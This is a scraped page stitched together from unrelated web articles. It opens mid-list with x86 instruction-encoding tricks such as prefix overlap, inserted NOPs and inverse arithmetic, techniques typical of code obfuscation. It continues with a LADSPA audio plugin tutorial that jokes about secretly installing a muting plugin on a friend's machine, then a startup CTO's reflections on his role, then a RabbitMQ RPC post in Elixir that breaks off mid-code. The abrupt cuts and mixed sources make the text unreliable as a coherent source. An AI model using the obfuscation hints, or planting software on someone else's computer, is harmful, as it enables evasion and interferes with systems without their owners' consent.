  <li>change an instruction encoding by using different prefixes or encoding mechanisms. If an instruction ends with <code>48</code>, we can simply prepend <code>48</code> to any instruction and it will be considered as a prefix. Guaranteeing overlap.</li>
  <li>re-order instructions before they get used like done in out-of-order execution</li>
  <li>alter an instruction, but appending the inverse of the change. i.e <code>ADD 2</code> would become <code>ADD 5</code> with <code>SUB 3</code> appended. This technique can also be used with memory locations but requires much more setup</li>
  <li>jumping ahead a few bytes S.T we can use later bytes instead of the current one in a given stream</li>
  <li>inserting nop’s or equivalents (or something like <code>add</code> and <code>sub</code> with the same argument). NOP’s are great since these can have long …</li></ul></div></article></div></div></div>

<p>Yesterday, I was looking for a way to add filters to my computer’s audio output and that’s when I met <strong>Linux Audio Developer’s Simple Plugin API</strong> aka <a href="https://www.ladspa.org/" target="_blank" rel="noopener">LADSPA</a>. My purpose was to do some post-processing on my computer’s audio output and it turned out the easiest way is to add a <strong>LADSPA</strong> sink to <strong>Pulseaudio</strong>. </p>
<p>The problem was I couldn’t find any <strong>LADSPA</strong> documentation. The <code>ladspa.h</code> header file and the examples in the <a href="http://www.ladspa.org/download/index.html" target="_blank" rel="noopener">LADSPA SDK</a> were the only sources to figure out how to use. They’re fine sources but if I could find a step-by-step explained example code, I’d have learned faster. So that’s how the idea of the infamous <strong>Annoying Mute Line</strong> plugin came out. Note that this tutorial doesn’t need an advanced <a href="https://en.wikipedia.org/wiki/Digital_signal_processing" target="_blank" rel="noopener">DSP</a> knowledge but you may need to read about <a href="https://en.wikipedia.org/wiki/Sampling_%28signal_processing%29" target="_blank" rel="noopener">sampling</a>.</p>
<h2 id="LADSPA-Basics"><a href="#LADSPA-Basics" title="LADSPA Basics"></a>LADSPA Basics</h2><p>Before moving into any code, let’s look at <strong>LADSPA</strong> basics. <strong>LADSPA</strong> is a very simple API, you just need to fill in a handler function and register it, and then the <strong>LADSPA</strong> host will call it every time it has some audio samples. </p>
<p>By the way, I want to explain what a <strong>LADSPA host</strong> is. A <strong>LADSPA host</strong> is a program that supports <strong>LADSPA</strong> plugins. You can see some of them <a href="https://wiki.linuxaudio.org/apps/categories/ladspa" target="_blank" rel="noopener">here</a>. <strong>Pulseaudio</strong> and <strong>ALSA</strong> are <strong>LADSPA</strong> hosts too.</p>
<p><strong>LADSPA</strong> has three main data types:</p>
<ul>
<li><p><code>Descriptor</code>: As you may understand from the name, it’s the descriptor of the plugin. It keeps handler function pointers, creator’s name, label, parameters, etc.</p>
</li>
<li><p><code>Port</code>: <em>Ports</em> are parameters of our plugin. We define our ports in the descriptor. </p>
</li>
<li><p><code>Handle</code>: This is our customized data type to track our algorithm’s state and is passed to our <code>run()</code> handler along with samples.</p>
</li>
</ul>
<p>It may be hard to understand why these data types are needed but it’ll get more clear later.</p>
<h2 id="Annoying-Mute-Line"><a href="#Annoying-Mute-Line" title="Annoying Mute Line"></a>Annoying Mute Line</h2><p>Now, the fun part. Let’s create an annoying plugin which mutes the output audio periodically for a specified amount of time. Later we may install this plugin into our friend’s machine and watch her eat her nails out of anger. Haha.</p>
<p>Our plugin should take two parameters, let’s say, <code>muteInterval</code> and <code>muteLength</code>. <code>muteInterval</code> is the time in seconds we’ll wait before we mute the audio, and <code>muteLength</code> is the time in seconds we’ll mute the audio for. To understand better, let’s listen to the little part of Isaac Asimov’s speech below:</p>


<p>If we apply our plugin to the audio with <code>muteInterval</code> be 2 seconds and <code>muteLength</code> be 1 second, we’ll get:</p>


<p>So you got the idea. Now, let’s dive into the code. If you haven’t installed <strong>LADSPA SDK</strong>, you may download it from <a href="http://www.ladspa.org/download/index.html" target="_blank" rel="noopener">here</a> or if you’re on <em>Ubuntu/Debian</em> just run:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>apt install ladspa-sdk</span><br></pre></td></tr></tbody></table></figure>

<p>Now, let’s define our handle:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></pre></td><td><pre><span></span><br><span><span>#<span>define</span> MUTED   0</span></span><br><span><span>#<span>define</span> UNMUTED !MUTED</span></span><br><span></span><br><span></span><br><span><span>typedef</span> <span><span>struct</span> {</span></span><br><span>    <span>unsigned</span> <span>long</span> sampleRate;</span><br><span></span><br><span>    <span>unsigned</span> <span>int</span> muteInterval; </span><br><span>    <span>unsigned</span> <span>int</span> muteLength;   </span><br><span></span><br><span>    LADSPA_Data *inputBuffer; </span><br><span>    LADSPA_Data *outputBuffer; </span><br><span></span><br><span>    <span>unsigned</span> <span>long</span> remaining; </span><br><span>    <span>unsigned</span> <span>int</span> state; </span><br><span>} AnnoyingMuteLine;</span><br></pre></td></tr></tbody></table></figure>

<p>This is the <code>struct</code> we’ll track our code’s state. Variable names explain themselves but I just want to go over the <code>remaining</code> and <code>state</code> variable. We’ll have two states <code>MUTED</code> and <code>UNMUTED</code>. In <code>UNMUTED</code> state, we’ll just forward the sample we read from input buffer to output buffer. In <code>MUTED</code> state, we’ll ignore the sample from the input buffer and write <code>0.0</code> to the output buffer. To keep track of time, we use the <code>remaining</code> variable. Every time we write to the output buffer, we’ll decrement <code>remaining</code> by one. If <code>remaining</code> is zero, we’ll toggle the <code>state</code> variable. <code>remaining</code> is calculated every time we toggle the <code>state</code>. For <code>MUTED</code> state, <code>remaining</code> initializes as <code>muteLength x sampleRate</code> and for <code>UNMUTED</code> state, it initializes as <code>muteInterval x sampleRate</code>.</p>
<p>Since we have our handle defined, now, we can fill our handler functions. <strong>LADSPA</strong> has several handler functions named:</p>
<ul>
<li><code>instantiate</code></li>
<li><code>connect_port</code></li>
<li><code>activate</code></li>
<li><code>run</code></li>
<li><code>run_adding</code></li>
<li><code>set_run_adding_gain</code></li>
<li><code>deactivate</code></li>
<li><code>cleanup</code></li>
</ul>
<p>We won’t be using <code>run_adding</code> and <code>set_run_adding_gain</code> but you can find more information about them in <code>ladspa.h</code> file. Let’s start with <code>instantiate</code>:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></pre></td><td><pre><span></span><br><span><span><span>static</span> LADSPA_Handle <span>instantiateMuteLine</span><span>(<span>const</span> LADSPA_Descriptor *descriptor,</span></span></span><br><span><span><span>                                      <span>unsigned</span> <span>long</span> sampleRate)</span> </span>{</span><br><span></span><br><span>    AnnoyingMuteLine *muteLine;</span><br><span></span><br><span>    muteLine = (AnnoyingMuteLine *)<span>malloc</span>(<span>sizeof</span>(AnnoyingMuteLine));</span><br><span></span><br><span>    <span>if</span> (muteLine == <span>NULL</span>) {</span><br><span>        <span>return</span> <span>NULL</span>;</span><br><span>    }</span><br><span></span><br><span>    muteLine-&gt;sampleRate = sampleRate;</span><br><span></span><br><span>    <span>return</span> muteLine;</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>

<p>This is where we create our handle and return it to the <strong>LADSPA</strong> host. It’s like a new instance of our plugin is created. Here in the code we just set the sample rate given by our host in our handle. Note that <code>LADSPA_Handle</code> is of type <code>void *</code> so we can provide it any type we want.</p>
<p><code>connect_port</code> handler is next:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></pre></td><td><pre><span></span><br><span><span>#<span>define</span> PORT_COUNT       4</span></span><br><span><span>#<span>define</span> ML_MUTE_INTERVAL 0</span></span><br><span><span>#<span>define</span> ML_MUTE_LENGTH   1</span></span><br><span><span>#<span>define</span> ML_INPUT         2</span></span><br><span><span>#<span>define</span> ML_OUTPUT        3</span></span><br><span></span><br><span></span><br><span><span><span>static</span> <span>void</span> <span>connectPort</span><span>(LADSPA_Handle handle, <span>unsigned</span> <span>long</span> port, LADSPA_Data *data)</span> </span>{</span><br><span>    AnnoyingMuteLine *muteLine = (AnnoyingMuteLine *) handle;</span><br><span></span><br><span>    <span>switch</span> (port) {</span><br><span>    <span>case</span> ML_MUTE_INTERVAL:</span><br><span>        muteLine-&gt;muteInterval = (<span>unsigned</span> <span>int</span>)*data;</span><br><span>        <span>break</span>;</span><br><span>    <span>case</span> ML_MUTE_LENGTH:</span><br><span>        muteLine-&gt;muteLength = (<span>unsigned</span> <span>int</span>)*data;</span><br><span>        <span>break</span>;</span><br><span>    <span>case</span> ML_INPUT:</span><br><span>        muteLine-&gt;inputBuffer = data;</span><br><span>        <span>break</span>;</span><br><span>    <span>case</span> ML_OUTPUT:</span><br><span>        muteLine-&gt;outputBuffer = data;</span><br><span>        <span>break</span>;</span><br><span>    }</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>

<p>Here we have four ports. You can think of it as we have four parameters. In this function, our host is providing us parameters so that we can set them in our handle. <strong>LADSPA</strong> says that <code>connect_port</code> handler will be called for each port but to support real-time changes, it may be called more than that. We’ll tell the parameter ids to our host later when we register our descriptor.</p>
<p>Now, let’s implement <code>activate</code>:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></pre></td><td><pre><span></span><br><span><span><span>static</span> <span>void</span> <span>activateMuteLine</span><span>(LADSPA_Handle handle)</span> </span>{</span><br><span>    AnnoyingMuteLine *muteLine = (AnnoyingMuteLine *)handle;</span><br><span></span><br><span>    muteLine-&gt;state = MUTED;</span><br><span>    muteLine-&gt;remaining = <span>0</span>;</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>

<p>Here is the activation of our instance. We set the state as <code>MUTED</code> and <code>remaining</code> as <code>0</code> so when our <code>run</code> handler is called, we can immediately toggle our state since there aren’t any remaining samples for the <code>MUTED</code> state. The difference between <code>activate</code> and <code>instantiate</code> is that <code>instantiate</code> is like creating an instance and <code>activate</code> is called on that instance. Our host may call <code>activate</code> and <code>deactivate</code> many times after calling <code>instantiate</code>.</p>
<p>Aaand <code>run</code>:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br></pre></td><td><pre><span></span><br><span><span><span>static</span> <span>void</span> <span>runMuteLine</span><span>(LADSPA_Handle handle, <span>unsigned</span> <span>long</span> sampleCount)</span> </span>{</span><br><span>    AnnoyingMuteLine *muteLine = (AnnoyingMuteLine *) handle;</span><br><span></span><br><span>    <span>for</span> (<span>unsigned</span> <span>long</span> i = <span>0</span>; i &lt; sampleCount; i++) {</span><br><span>        <span>if</span> (muteLine-&gt;remaining == <span>0</span>) {</span><br><span>            muteLine-&gt;state = !muteLine-&gt;state;</span><br><span></span><br><span>            <span>if</span> (muteLine-&gt;state == MUTED) {</span><br><span>                muteLine-&gt;remaining = muteLine-&gt;sampleRate * muteLine-&gt;muteLength;</span><br><span>            }</span><br><span>            <span>else</span> {</span><br><span>                muteLine-&gt;remaining = muteLine-&gt;sampleRate * muteLine-&gt;muteInterval;</span><br><span>            }</span><br><span>        }</span><br><span></span><br><span>        <span>if</span> (muteLine-&gt;state == MUTED) {</span><br><span>            muteLine-&gt;outputBuffer[i] = <span>0</span>;</span><br><span>        }</span><br><span>        <span>else</span> {</span><br><span>            muteLine-&gt;outputBuffer[i] = muteLine-&gt;inputBuffer[i];</span><br><span>        }</span><br><span></span><br><span>        muteLine-&gt;remaining--;</span><br><span>    }</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>

<p>Here, our host provides us the sample count written to the input buffer and the handle. For every sample, we apply the logic described under the definition of <code>AnnoyingMuteLine</code>. Nothing more.</p>
<p>Last of all, let’s implement <code>cleanup</code>:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span><span>static</span> <span>void</span> <span>cleanupMuteLine</span><span>(LADSPA_Handle handle)</span> </span>{</span><br><span>    AnnoyingMuteLine *muteLine = (AnnoyingMuteLine *) handle;</span><br><span></span><br><span>    <span>free</span>(handle);</span><br><span>}</span><br></pre></td></tr></tbody></table></figure>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  <p>There is a lot written about the importance of scaling as a founder in a fast-growing startup. Most of it focused on the CEO role. The generic advice on leadership also applies to other non-CEO roles, but I could not find a lot of content targeted to technical founders. In fact, after reading a <a href="https://twitter.com/elwatto/status/1230977002192031744?s=20" target="_blank">bunch of S-1 forms</a>, <strong>it was hard to find first-time CTOs going all the way from MVP to IPO</strong> (as opposed to founding CEOs). I found this fact really intriguing, and I wanted to dig deeper to try to understand the reasons. It was also stressing me out to some degree: <em>what if I don’t manage to scale fast enough? What does scaling even mean? I’d rather prepare before it becomes a real problem! I want to be the CTO who makes <a href="https://revenuecat.com/" target="_blank">RevenueCat</a> a public company!</em><sup>1</sup></p>

<p>Is it really much harder for non-CEO founders to scale quickly? Or perhaps it is that CEOs have a stronger support network. These could be the reasons. Or maybe I was asking the wrong question. After talking to a lot of founder CTOs, there was something clear: <strong>there is no standard definition for the CTO role</strong>, responsibilities will totally change <strong>depending on the company and the stage</strong>. At inception, the CTO is probably a glorified individual contributor, but this can escalate very quickly. Everyone’s experiences are different. Unfortunately, I don’t have the answers for other non-CEO founder roles, and maybe I don’t even have it for first-time CTOs either. However, I thought it would be a good self-awareness exercise to reflect on the things I’ve learned and how my responsibilities have changed during the first 3 years at <a href="https://revenuecat.com/" target="_blank">RevenueCat</a>.</p>

<h3 id="the-cto-vs-vp-of-engineering-dilemma">The CTO vs VP of Engineering dilemma</h3>
<p>Simplifying, we could say that the CTO role is closer to architecture and code; whereas the VPE would be in charge of processes and management. A simple analogy could be the Senior/Staff Engineer path versus the Engineering Management career path.</p>

<p>During the early days, you need a CTO to architect and coordinate a small group of ICs hacking the minimum viable product. At this stage, being a founder is extremely helpful to set the vision of the product and the engineering culture. Ideally, the CTO is a domain expert in the problem that the startup is trying to solve.</p>

<p>But what if the product becomes successful? What if you reach product-market fit? You will need to hire a lot more engineers to satisfy customer demands. That’s a great problem to have. You might get lucky and get funding, or you might even be profitable already. But a higher headcount means more polished processes. At some point, somebody will inevitably need to start wearing the VP of Engineering hat. It will happen, and it will become quite obvious as the previous (or lack of) processes start to break. You have a couple of options at this stage. The CTO can start acting as VPE, or you can hire externally. It is probably a matter of personal preference or previous management experience. But <strong>it is a totally different set of skills</strong>, which might be difficult to acquire in a hyper-growth environment. Therefore, most commonly, the VP of Engineering is <a href="https://www.saastr.com/makes-bad-cto/" target="_blank">hired externally</a>.</p>

<p>If you are a founder you have some flexibility. You might have control to decide which way you want to go. Perhaps you hate people management and want to keep using your technical skills and problem knowledge to influence the technology directly. Or maybe you want to improve your management skills. Early employees tend to be more forgiving about founder managerial flaws. They joined because they trusted the founders, believed in the vision, and know they have good intentions. In the beginning, they might even prefer you as a direct manager than an external person. But eventually, there will be several layers of management, so you better learn fast if you want to follow this path and don’t have the experience.</p>

<p>Bryan Helmig, Zapier’s co-founder and CTO, says you need to <a href="https://zapier.com/engineering/startup-cto/" target="_blank"><em>figure out where you get your dopamine hits</em></a>. Personally, I have always been more of a <em>computer person</em> than a <em>people person</em>. 
I was not sure which path I should take, but I would have bet on the one involving computers. I’ve always loved them, and I would say I am a better, more experienced engineer than I am a manager. I feel  more energized after shipping a new feature than during a one-on-one meeting.</p>

<p>However, as a founder, <strong>I get the dopamine hits when the company is doing well</strong>. When a customer recommends our product. When we hit the revenue goal. When we hire engineers that are better than me. When these engineers are happy and successfully shipping ambitious features. When code review is exhaustive but collaborative, not adversarial.</p>

<p>So, ultimately, I’ve taken the approach to not simply follow my personal preference, but to <strong>do whatever is more impactful for the company at each stage</strong>. I am a problem solver after all. That is how I have been thinking about my role. My <strong>founder identity should be more important than my CTO title</strong>. In the long run, as a major shareholder, I need to do whatever is best for the company.</p>

<p>Typically breaking points start happening <strong>somewhere between 8 and 12 engineers</strong>. But it can be different depending on the product and the environment. In our case, as a fully distributed company, we encountered several breaking points as we were adding new time zones. During this <em>no man’s land stage</em> most technical founders are temporarily forced to wear both CTO and VPE hats simultaneously. Being flexible turned out to be very advantageous. I tried to step up and (poorly and temporarily) do work that nobody had the bandwidth to do. This helped me to identify the pain points and tweak the process or hire somebody to take over these tasks.</p>

<p>One thing that helped me a lot to navigate my role was to learn how other founders were spending their time at each stage. I have been journaling since we started the company. Based on these notes, I will briefly describe the tasks I’ve been focused on and how my role has evolved.</p>

<h2 id="2018-yc-mvp-and-first-hires">2018: YC, MVP, and first hires</h2>
<p>When we did Y-Combinator it was only <a href="https://twitter.com/jeiting" target="_blank">Jacob</a> and me. Jacob would write SDK and frontend code and I would focus on the backend and infrastructure. After YC we hired our first two engineers to take over Jacob’s coding responsibilities full time. We were all based in San Francisco and these hires were people we already knew. Easy (almost inexistent) management. <strong>There was no process overhead</strong>, we had one-week sprints and <strong>we were moving really fast</strong>.</p>

<p>These days were stressful but fun. We were setting the foundations of the engineering culture and seeing customers signing up one by one. Most of my time was spent architecting the initial version of features, listening to customers, and building their requests as fast as we humanly could. <strong>We would ship most requests on the same day</strong>.</p>

<p>My biggest concern here was making sure we were building something people wanted and the ability to keep growing to justify our <a href="https://techcrunch.com/2018/10/24/revenuecat-seed-funding/" target="_blank">$1.5M seed round</a>.</p>

<p><strong>Main learnings</strong>: Too many, impossible to summarize. We learned a lot while doing Y-Combinator. The main thing would be that talking to customers, building what they want, and making them happy was paramount. We even made this and shipping fast two of our <a href="https://www.revenuecat.com/blog/values" target="_blank">core values</a>.</p>

<h2 id="2019-keeping-up-with-customers-and-scaling-the-tech">2019: Keeping up with customers and scaling the tech</h2>
<p>It looks like we had achieved some kind of product-market fit. <strong>Customers were coming to us, support tickets started piling up and our API throughput would increase every day</strong>. We added our first remote engineer, located in Taiwan. The time zone difference was hard initially and we needed to adapt processes. But it all worked out fine. We got better coverage for customer requests and monitoring.</p>

<p><strong>Onboarding was a complete, one-off manual process</strong>. I started doing one-on-ones (not very regularly, maybe once a month), but <strong>management was still pretty light</strong>. Most conversations were still very technical. I was still an individual contributor. I was also on booth duty at a couple of conferences.</p>

<figure>
  <img src="https://miguelcarranza.es/assets/posts/boothduty.JPG" alt="Booth Duty, AltConf 2019">
</figure>

<p>My main concern at this stage was purely technical: <strong>the scalability of our systems</strong>. All of our engineers had a more product-oriented background, and we had some clear single points of failure. Not going down was constantly in my mind. The scale was outgrowing my comfort zone every single day. We did a decent job optimizing the most common scenarios, <a href="https://www.revenuecat.com/blog/aurora-migration-zero-downtime" target="_blank">migrating infrastructure before reaching breaking points</a>, and <strong>paying down the technical debt we took the year before</strong>.</p>

<p>Up until Q4, I was the de-facto on-call engineer. I did not want to disturb other team members outside working hours, and I felt reliability was my ultimate responsibility as a technical founder. I would carry my laptop literally everywhere. Eventually, <strong>we implemented an on-call rotation, and in retrospect, we should have done it earlier</strong>.</p>

<p><strong>Main learnings</strong>: Do not stress over scalability, but monitor as much as possible and always look out for the next bottleneck and single point of failure. Again, these are stressful but great problems to have. Establish an on-call policy as soon as possible, train engineers, and document resolution for known incidents. Rely on your team. <a href="https://miguelcarranza.es/technical-debt" target="_blank">Technical debt is actually good</a> if taken responsibly while trying to find product-market fit.</p>

<h2 id="2020-delegation-and-planning-the-future-organization">2020: Delegation and planning the future organization</h2>
<p>In 2020 we doubled the team again. We added engineers in Europe and Latin America. By the end of the year, we had multiple members in every team (SDK, frontend, backend…). We were able to work on several projects at the same time, and finally tackle more ambitious features. But we needed more coordination. <strong>A little bit of management structure was unavoidable at this stage.</strong></p>

<p>During Q1 and Q2 I spent most of my time reviewing code, providing architectural guidance, and coding a little bit on the side. I was still the person who had more context about our systems. By mid-year, it became very obvious that I was the bottleneck for …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>At <a href="https://www.community.com/">Community</a> we use <a href="https://www.rabbitmq.com/">RabbitMQ</a>, a lot. It’s the infrastructure backbone that allows our services (over fourty at this point) to communicate with each other. That mostly happens through <strong>events</strong> (since we have an event-sourced system), but in some cases what we need is a <em>request-response</em> interaction between two services. This is the best tool in a few use cases, like retrieving data on the fly or asking a service to do something and return a response. An industry standard for such interactions is HTTP, but we are not big fans of that. Instead, since RabbitMQ is so ubiquitous in our system, we settled on using it for request-response interactions as well in the form of <strong>Remote Procedure Calls</strong> (RPCs). In this post, I’ll go over the architecture of such interactions, the RabbitMQ topologies we use to make them work, the benefits around reliability and the compromises around performance, and finally how this all implemented to be as fault-tolerant as possible with Elixir.</p>

<h2 id="what-is-an-rpc">What is an RPC</h2>

<p>An RPC can be seen as a function call across sytem boundaries, instead of at the code execution level. An RPC allows you to call a <em>procedure</em> on another service and treat it mostly like a local function call (with the additional error handling to account for the network interaction).</p>

<p><img alt="Sketch of caller and receiver of an RPC" src="https://andrealeopardi.com/assets/media//2020-11-23-rpc-over-rabbitmq-with-elixir/sketch-rpc-definition.png"></p>

<p>I won’t go into too much detail about RPCs themselves, but you’re probably familiar with a common form of RPC: HTTP. HTTP request-response interactions between services in a service-oriented architecture are essentially RPCs, they’re just less explicit on the fact that they’re <em>calling a procedure</em>. One of the benefits of RPCs is, like HTTP, that they are agnostic of technologies. A services written in Elixir can make an RPC (or HTTP request) to a service written in Go, for example. If you want to read more about RPCs, their definition, their benefits, and more, guess where I’ll link you to? Exactly, <a href="https://en.wikipedia.org/wiki/Remote_procedure_call">Wikipedia</a>.</p>

<p>Throughout this post, I will refer to the services involved in an RPC as the <strong>caller service</strong> and the <strong>receiver service</strong>.</p>

<h2 id="why-rpcs-over-rabbitmq">Why RPCs over RabbitMQ</h2>

<p>At Community, we chose to do RPCs over RabbitMQ, instead of the common service-to-service communication via HTTP, for a few reasons.</p>

<p>The main reason is that we want to use message queues as often as possible. When you have a queue-based message broker between services that talk to each other, the availability requirements of the services can be less demanding. If you have two services that communicate over HTTP, then if the receiver service is down it means that the requester service will not get a response and will have to implement request retries in order to increase the chances of a successful request. With RabbitMQ in the middle, if the receiver is down then the RPC is queued and can be picked up once the receiver comes back up.</p>

<p>Another important reason that influenced our decision is that we make heavy use of RabbitMQ for all sorts of things. This means our engineer know it well, our infrastructure is solid, and we have good systems to trace and observe messages flowing through it.</p>

<p>One compromise we had to make is that, generally speaking, RPCs over RabbitMQ tend to be <em>slower</em> than direct service-to-service communication (such as HTTP). This is hard to avoid given that in our case we have a message broker sitting between the caller service and the receiver service. That means that you’ll <em>at least</em> have twice the RTT (round-trip time) on the network, since the messages you’re sending and receiving need to jump through one more hop than if you do direct service-to-service communication. However, when we do RPCs the bottleneck is rarely the network or the message broker, and instead tends to be the processing of the RPC itself. So, we’re fine with the compromise here.</p>

<h2 id="rabbitmq-topology">RabbitMQ topology</h2>

<p>Let’s talk about the <strong>RabbitMQ topology</strong> that powers our RPC system. We have the following components in place:</p>

<ul>
  <li>
    <p>A <em>headers</em> exchange called <code>rpc</code>. Caller services publish RPCs to this exchange with two headers, <code>destination</code> (the receiver service name) and <code>procedure</code> (the procedure name).</p>
  </li>
  <li>
    <p>Per-service queues where RPCs end up. Their name usually looks like <code>receiver_service.rpcs</code>. A single queue is shared across multiple <em>instances</em> (nodes) of the same service. All the running instances of the receiver service consume from this queue.</p>
  </li>
  <li>
    <p>A binding between each per-service queue and the <code>rpc</code> exchange. Since <code>rpc</code> is a headers exchange, the binding happens on the headers. Most commonly, receiver services bind their queue to the <code>rpc</code> exchange on the <code>destination: receiver_service_name</code> header, but sometimes we can be more flexible and specific by also using the <code>procedure</code> header.</p>
  </li>
  <li>
    <p>A per-instance <em>response queue</em> where responses to RPCs are published by the receiver service. Each <em>instance</em> of the caller service consumes from its dedicated response queue.</p>
  </li>
</ul>

<p>Below is an artistic representation of the RabbitMQ topology. This one is for you, my visual friends.</p>

<p><img alt="Sketch of RabbitMQ topology" src="https://andrealeopardi.com/assets/media//2020-11-23-rpc-over-rabbitmq-with-elixir/sketch-rabbitmq-topology.png"></p>

<h2 id="caller-architecture">Caller architecture</h2>

<p>Our focus when designing this architecture <em>was not</em> performance. Since our system is event-sourced, when services need to access data <em>fast</em>, we usually have alternatives to RPCs. In those cases, instead of fetching data from another service via RPC, a service can usually build a “local” data store (usually Redis, but whatever fits best) by consuming events and have fast access to that data store. However, this doesn’t cover use cases where a service wants to ask another service to do something and return a result. This can be usually also be done via asynchronous events, but sometimes it really can’t and in any case we like the agility of RPCs for when we’re moving fast and don’t want to commit to particular data exchanges in the long term.</p>

<p>Instead, we heavily focused on reliability and resource utilization. We want our RPCs to succeed whenever they can. We also want to limit RabbitMQ resource utilization as much as possible, since the message broker architecture shares the broker between all the services that use it.</p>

<p>With these goals in mind, we came up with the topology described above. In the sketch below, I’m focusing on the caller service perspective.</p>

<p><img alt="Sketch of the architecture of the sender service" src="https://andrealeopardi.com/assets/media//2020-11-23-rpc-over-rabbitmq-with-elixir/sketch-caller-architecture.png"></p>

<p>This is what happens, step by step, when a service makes an RPC:</p>

<ul>
  <li>
    <p>The caller assigns a new UUID to the request and encodes the request (we happen to use Protobuf, but anything would work).</p>
  </li>
  <li>
    <p>The caller includes the name of the <em>response queue</em> in the <code>reply_to</code> metadata field of the RabbitMQ message.</p>
  </li>
  <li>
    <p>The caller publishes the request on the main RPC exchange (<code>rpc</code>) using headers to specify the <code>destination</code> and <code>procedure</code> to call.</p>
  </li>
  <li>
    <p>If publishing the request is successful, the caller stores the request in an in-memory key-value store (ETS for Elixir and Erlang folks), storing the mapping from request ID to caller process. This is used to map responses back to requests when they come back.</p>
  </li>
  <li>
    <p>The caller has a pool of AMQP channels also consuming from the response queue. When the response comes back on such queue, a consumer channel picks it up, finds the corresponding caller process from the in-memory key-value store, and hands the caller process the response.</p>
  </li>
</ul>

<p>From a code standpoint, an RPC really does look like a function call. The main difference is that an RPC can <em>definitely</em> fail due to the network interaction, so we always make sure to return a successful value or an error value. In Elixir, that translates to <code>{:ok, response}</code> or <code>{:error, reason}</code> tuples. In a typed language (say Haskell) it would be the “either” type. In Elixir-flavoured pseudocode, this is what an RPC looks like from the caller side:</p>

<div><div><pre><code><span>case</span> <span>RPCPool</span><span>.</span><span>call</span><span>(</span><span>"my_receiver_svc"</span><span>,</span> <span>"add"</span><span>,</span> <span>%{</span><span>"args"</span> <span>=&gt;</span> <span>[</span><span>4</span><span>,</span> <span>9</span><span>]})</span> <span>do</span>
  <span>{</span><span>:ok</span><span>,</span> <span>%{</span><span>"result"</span> <span>=&gt;</span> <span>result</span><span>}}</span> <span>-&gt;</span>
    <span>result</span> <span>#=&gt; 13</span>

  <span>{</span><span>:error</span><span>,</span> <span>reason</span><span>}</span> <span>-&gt;</span>
    <span>raise</span> <span>"failed because: </span><span>#{</span><span>inspect</span><span>(</span><span>reason</span><span>)</span><span>}</span><span>"</span> <span>#=&gt; such as :timeout</span>
<span>end</span>
</code></pre></div></div>

<h3 id="the-response-queue">The response queue</h3>

<p>It’s worth focusing on the <strong>response queue</strong>. This queue is declared by all AMQP channels in the caller pool when they start up. This is a common pattern in RabbitMQ since declaring resources (queues, exchanges, and bindings) is <em>idempotent</em>, that is, you can do it as many times as you want and the resource is declared only once.</p>

<p>The response queue is declared with a key property: <code>auto_delete</code>. When this property is present, a queue is deleted as soon as there are no channels consuming from it anymore. This is exactly the behavior we want: as long as a caller pool is “up and running”, there’s gonna be at least one channel consuming from the queue and handing responses over to caller processes. However, if the whole pool or the whole node for the caller goes down then the queue will be deleted. This works perfectly, because if the caller node goes down, then we likely lost the “context” of the requests, and even if the node will come back up then it won’t know what to do with the responses anymore. As <a href="https://www.rabbitmq.com/direct-reply-to.html">one RabbitMQ documentation page</a> puts it:</p>

<blockquote>
  <p>Reply messages sent using [RPC] are in general not fault-tolerant; they will be discarded if the client that published the original request subsequently disconnects. The assumption is that an RPC client will reconnect and submit another request in this case.</p>
</blockquote>

<p>In this way, we allow RabbitMQ to clean itself up and avoid leaving garbage in it, without writing any code to do so.</p>

<p>The code for each AMQP channel that consumes responses goes something like this:</p>

<div><div><pre><code><span>channel</span> <span>=</span> <span>AMQP</span><span>.</span><span>Channel</span><span>.</span><span>open</span><span>(</span><span>amqp_connection</span><span>)</span>

<span># "response_queue" is determined per-pool.</span>
<span># Usually it looks like: "caller_service.#{UUID.generate()}"</span>
<span>AMQP</span><span>.</span><span>Queue</span><span>.</span><span>declare</span><span>(</span><span>channel</span><span>,</span> <span>response_queue</span><span>,</span> <span>auto_delete:</span> <span>true</span><span>)</span>

<span>AMQP</span><span>.</span><span>Basic</span><span>.</span><span>consume</span><span>(</span><span>channel</span><span>,</span> <span>response_queue</span><span>)</span>
</code></pre></div></div>

<p>When a response comes back, the caller does a key lookup on the response’s request ID in the in-memory key-value data store to retrieve the original request and moreover the process that’s waiting on the response. It looks like this:</p>

<div><div><pre><code><span>def</span> <span>handle_rabbitmq_message</span><span>(</span><span>message</span><span>)</span> <span>do</span>
